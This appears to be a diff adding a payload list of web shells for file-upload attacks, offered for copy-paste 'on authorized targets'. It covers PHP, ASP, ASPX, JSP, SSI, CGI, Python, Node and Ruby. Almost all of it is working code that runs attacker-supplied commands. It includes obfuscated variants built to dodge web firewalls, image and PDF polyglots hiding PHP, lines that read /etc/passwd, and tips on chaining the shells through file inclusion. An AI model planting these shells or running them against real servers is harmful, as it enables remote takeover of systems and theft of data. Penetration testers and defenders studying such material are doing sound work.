@@ -1,0 +1,231 @@
+# WEBSHELL — REAL-WORLD WORKING PAYLOADS (2026)
+# Author: MD MAHABUBUR RAHMAN  —  Authorized targets only.
+# Copy-paste these as the file BODY during upload. Use with the matching
+# extension from waf-bypass-payloads.txt. Replace markers (<CID> etc.).
+
+# 1. PHP — MINIMAL (works on any PHP 5/7/8)
+<?php system($_GET['c']);?>
+<?php system($_POST['c']);?>
+<?php @system($_GET['c']);?>
+<?php passthru($_GET['c']);?>
+<?php exec($_GET['c']);?>
+<?php shell_exec($_GET['c']);?>
+<?php popen($_GET['c'],'r');?>
+<?php proc_open($_GET['c'],[],$p);?>
+<?php echo `$_GET[0]`;?>
+<?=`$_GET[0]`?>
+<?php @$_GET['c']($_GET['a']);?>
+<?php @$_REQUEST['c']($_REQUEST['a']);?>
+<?php assert($_POST['x']);?>
+<?php @assert($_POST['x']);?>
+<?php echo eval($_POST['x']);?>
+<?php @eval($_POST['x']);?>
+<?php $_GET['c']($_GET['c']($_GET['a']));?>
+<?php call_user_func($_GET['f'],$_GET['a']);?>
+
+# 2. PHP — WAF / SIGNATURE DODGE (no "system/eval" literal)
+<?php $a='sys'.'tem';$a($_GET['c']);?>
+<?php ($a='sys'.'tem')($_GET['c']);?>
+<?php $f='sy'.'st'.'em';$f($_GET['c']);?>
+<?php $_='s'.'y'.'s'.'t'.'e'.'m';$_($_GET['c']);?>
+<?php $x=base64_decode('c3lzdGVt');$x($_GET['c']);?>
+<?php ${'_'.'x'.'x'.'_'}=c;echo`${'_'.'x'.'x'.'_'}`;?>
+<?php assert(base64_decode($_POST['x']));?>
+<?php @eval(base64_decode($_POST['x']));?>
+<?php @eval(str_rot13($_POST['x']));?>
+<?php preg_replace('/.*/e',$_POST['x'],'');?>
+<?php $e='e'.'v'.'a'.'l';$e($_POST['x']);?>
+<?php "\x73\x79\x73\x74\x65\x6d"($_GET['c']);?>
+<?php \x73\x79\x73\x74\x65\x6d($_GET['c']);?>
+<?php @call_user_func('sys'.'tem',$_GET['c']);?>
+<?php array_map('sys'.'tem',[$_GET['c']]);?>
+<?php $f='create_function';$x=$f('',$_POST['x']);$x();?>
+<?php $GLOBALS['_']='system';$GLOBALS['_']($_GET['c']);?>
+<?php /*\(\*/ $_GET[base64_decode('Yw==')](...) ?>
+<?php $k=chr(99);system($$k);?>
+<?php $a='c';system($$a);?>
+
+# 3. PHP — SHORT_TAG / WRAPPER VARIANTS (register_globals era, still live on legacy)
+<?=$_GET[0]?>
+<% system($_GET['c']); %>
+<script language="php">system($_GET['c']);</script>
+<?php include($_GET['f']);?>
+<?php include_once($_GET['f']);?>
+<?php require($_GET['f']);?>
+<?php readfile($_SERVER['DOCUMENT_ROOT'].$_GET['f']);?>
+<?php phpinfo();?>
+
+# 4. PHP — STRING-BUILT COMMANDS (bypasses keyword WAF)
+<?php $s='sy'.chr(115).'tem';$s($_GET['c']);?>
+<?php $s="system";$s($_GET['c']);?>
+<?php $x=$_POST;@$x['a']($x['b']);?>
+<?php @${'a'.'s'.'s'}($_POST['x']);?>
+<?php $a=array('s','y','s','t','e','m');$f=implode('',$a);$f($_GET['c']);?>
+<?php $f='SYSTEM';$f=strtolower($f);$f($_GET['c']);?>
+<?php $f=strrev('metsys');$f($_GET['c']);?>
+<?php $f='sys'.str_rot13('gRZ');$f($_GET['c']);?>
+<?php $f=implode(array('s','y','s','t','e','m'));$f($_GET['c']);?>
+<?php $f=chr(115).chr(121).chr(115).chr(116).chr(101).chr(109);$f($_GET['c']);?>
+
+# 5. PHP — FILE WRITE / UNIVERSAL (upload a file from shell)
+<?php file_put_contents($_GET['f'],$_GET['d']);?>
+<?php $f=$_GET['f'];$d=$_GET['d'];file_put_contents($f,$d);?>
+<?php $fp=fopen($_GET['f'],'w');fwrite($fp,$_GET['d']);fclose($fp);?>
+<?php @copy($_GET['s'],$_GET['d']);?>
+<?php include('data://text/plain;base64,'.$_GET['b']);?>
+<?php // data:// wrapper test
+$c=isset($_GET['c'])?$_GET['c']:'id';$h=$_SERVER['HTTP_HOST'];echo "POC:$h:";system($c);?>
+
+# 6. PHP — FEATURE-COMPLETE (authorized engagements, no OS risk beyond token)
+<?php
+if(isset($_REQUEST['c'])){
+echo '<pre>'.htmlspecialchars(shell_exec($_REQUEST['c'])).'</pre>';
+} else { echo 'WebShell-Panel: send ?c=id'; }
+?>
+<?php
+header('Content-Type: text/plain');
+if(isset($_GET['c'])){system($_GET['c']);}else{echo 'usage: ?c=id';}
+?>
+<?php
+if(isset($_GET['cmd'])){echo shell_exec($_GET['cmd']);} else {echo '?cmd=id';}
+?>
+
+# 7. ASP — CLASSIC (IIS, .asp / .asa / .cer)
+<%execute request("c")%>
+<%execute(request("c"))%>
+<%response.write(server.createobject("WSCRIPT.SHELL").exec("cmd /c "&request("c")).stdout.readall)%>
+<%Eval(request("x"))%>
+<%=server.createobject("WSCRIPT.SHELL").exec("cmd /c "&request("c")).stdout.readall%>
+<%Set s=Server.CreateObject("WScript.Shell"):Response.Write(s.exec("cmd /c "&request("c")).stdout.readall)%>
+<%new ActiveXObject("WScript.Shell")%>
+
+# 8. ASPX — C# (IIS, .aspx / .ashx)
+<%@ Page Language="C#" %><%@ Import Namespace="System.Diagnostics" %><%Response.Write(new Process(){StartInfo=new ProcessStartInfo("cmd.exe","/c "+Request["c"]){UseShellExecute=false,RedirectStandardOutput=true}}.Start().StandardOutput.ReadToEnd());%>
+<%@ Page Language="C#" %>
+<%
+System.Diagnostics.Process p = new System.Diagnostics.Process();
+p.StartInfo.FileName = "cmd.exe";
+p.StartInfo.Arguments = "/c " + Request["c"];
+p.StartInfo.UseShellExecute = false;
+p.StartInfo.RedirectStandardOutput = true;
+p.Start();
+Response.Write(p.StandardOutput.ReadToEnd());
+%>
+<%@ WebHandler Language="C#" Class="h" %>
+public class h : IHttpHandler { public void ProcessRequest(HttpContext x){ System.Diagnostics.Process.Start("cmd","/c "+x.Request["c"]); } public bool IsReusable{get{return true;}} }
+<%@ Page Language="C#" %><%eval(Request["x"])%>
+
+# 9. JSP — OUTPUT-CAPABLE (Tomcat, .jsp / .jspx)
+<%Runtime.getRuntime().exec(request.getParameter("c"));%>
+<%Process p=Runtime.getRuntime().exec(request.getParameter("c"));java.io.InputStream i=p.getInputStream();int a;while((a=i.read())!=-1)out.print((char)a);%>
+<%
+Runtime rt=Runtime.getRuntime();
+Process p=rt.exec(new String[]{"/bin/sh","-c",request.getParameter("c")});
+java.io.BufferedReader br=new java.io.BufferedReader(new java.io.InputStreamReader(p.getInputStream()));
+String l;while((l=br.readLine())!=null)out.println(l);
+%>
+<%=java.io.BufferedReader%>
+<%
+if(request.getParameter("c")!=null){out.print("<pre>");
+try{java.util.Scanner s=new java.util.Scanner(Runtime.getRuntime().exec(request.getParameter("c")).getInputStream()).useDelimiter("\\A");out.print(s.hasNext()?s.next():"");}catch(Exception e){}
+out.print("</pre>");}else{out.print("?c=id");}
+%>
+
+# 10. JSPX — XML-COMPLIANT
+<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="1.2">
+<jsp:directive.page contentType="text/plain"/>
+<jsp:scriptlet>if(request.getParameter("c")!=null){java.util.Scanner s=new java.util.Scanner(Runtime.getRuntime().exec(request.getParameter("c")).getInputStream()).useDelimiter("\\A");out.println(s.hasNext()?s.next():"");}</jsp:scriptlet>
+</jsp:root>
+
+# 11. WAR — SERVLET ENTRY (deployable)
+# web.xml servlet-mapping -> class "C" with doGet(Request c -> Runtime.exec)
+
+# 12. SSI (Apache mod_include, .shtml)
+<!--#exec cmd="id"-->
+<!--#exec cmd="cat /etc/passwd"-->
+<!--#include virtual="/etc/passwd"-->
+<!--#include virtual="/index.php"-->
+<!--#echo var="DOCUMENT_ROOT"-->
+<!--#config errmsg="XSS"-->
+<!--#exec cgi="/cgi-bin/echo.pl"-->
+?#exec cmd="id"
+
+# 13. CGI / PERL
+#!/usr/bin/perl
+print "Content-Type: text/plain\n\n";
+print qx{$ENV{'QUERY_STRING'}};
+#!/usr/bin/perl
+print `id`;
+#!/bin/sh
+echo "Content-Type: text/plain"
+echo ""
+id
+
+# 14. PYTHON CGI / WSGI
+#!/usr/bin/env python
+print("Content-Type: text/plain\n")
+import subprocess,os
+os.system("id")
+#!/usr/bin/env python3
+print("Content-Type: text/plain\n")
+import subprocess;print(subprocess.run(["id"],capture_output=True).stdout.decode())
+# WSGI .py on Flask/Django debug paths
+from os import system;system("id")
+
+# 15. NODE.JS / .JS
+require('child_process').execSync('id')
+require('child_process').exec(require('child_process').execSync('id')+'')
+res.send(require('child_process').execSync('id').toString())
+
+# 16. RUBY / RAILS
+<%= `id` %>
+<% system("id") %>
+exec "id"
+
+# 17. POLYGLOT — WEB/SERVER DUO (one file, two runtimes)
+GIF89a
+<?php system($_GET['c']);?>
+GIF89a;
+<?php @eval($_POST['x']);?>
+\x89PNG\r\n\x1a\n<?php system($_GET['c']);?>
+\xff\xd8\xff\xe0<?php @eval($_POST['x']);?>
+%PDF-1.4
+<?php system($_GET['c']);?>
+<?php if(false): ?>
+<svg onload="alert(1)"></svg>
+<?php endif; ?>
+<?php // simple .svg polyglot (server sees PHP, browser sees SVG)
+header('Content-Type: image/svg+xml');?>
+<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script></svg>
+
+# 18. POLYGLOT — ASP/ASPX MIX (IIS ignores what it can't parse)
+<%
+if("asp"=="asp"){execute(request("c"))}
+%>
+<%@ Page Language="C#" %><% Response.Write("ASPNET"); %>
+
+# 19. TEMPLATE / SERVER-SIDE MARKUP (if rendered server-side)
+{{ construction }}# expression: system(cmd) via SSTI
+<%= system("id") %>   (ERB/Rails)
+#{system("id")}       (Velocity/TemplateTool)
+${system('id')}       (some Java templates)
+<%bean:write name="x"/>   (Struts)
+
+# 20. UPLOAD-MARKER PROOF (harmless token to confirm execution first)
+<?php echo "POCUPLOAD"; ?>
+POCUPLOAD-<?php echo PHP_VERSION; ?>
+<?php echo "POC".md5("payload-repo"); ?>
+
+# 21. TEST-ME — GUESS-RESISTANT WEBROOT WRITE (find webroot via error probe)
+<?php echo $_SERVER['DOCUMENT_ROOT']; ?>
+<?php echo __DIR__; ?>
+<?php echo ini_get('doc_root'); ?>
+<?php echo getcwd(); ?>
+<?php echo phpinfo(INFO_ENVIRONMENT); ?>
+
+# RULES
+# - Always start with a token-echo shell (21) to PROVE execution, then cleanup.
+# - Pair with an extension that the web server/vhost actually executes
+#   (waf-bypass-payloads.txt handles the FILENAME half).
+# - If the shell won't run standalone, include it via LFI/php://filter.
+# - Authorized targets only. Delete payloads after the test.
